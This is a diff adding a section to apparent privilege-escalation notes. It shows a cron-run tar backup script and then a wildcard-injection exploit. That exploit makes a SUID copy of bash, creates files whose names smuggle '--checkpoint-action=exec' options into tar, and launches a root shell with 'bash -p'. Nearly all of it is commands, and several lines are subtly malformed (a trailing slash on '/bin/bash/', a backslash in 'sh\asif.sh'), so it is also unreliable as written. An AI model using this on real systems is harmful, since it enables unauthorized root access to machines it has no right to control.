@@ -57,4 +57,29 @@ cat /etc/cron.deny*
 
    ## compress.sh
    
+      cat <PATH=compress.sh>
+      
+   ## OUTPUT
+   
+          #!/bin/sh
+          cd /home/user
+          tar czf /tmp/backup.tar.gz *
+          
+   ## Exploit wildcards
+   
+        echo 'cp /bin/bash/ /tmp/bash; chmod +s /tmp/bash' > asif.sh
+        chmod 777 asif.sh
+        touch /home/user/--checkpoint=1
+        touch /home/user/--checkpoint-action=exec=sh\asif.sh
+        /tmp//bash -p
+        
+        
+        
+        
+        
+   
+   
+   
+   
+   
      
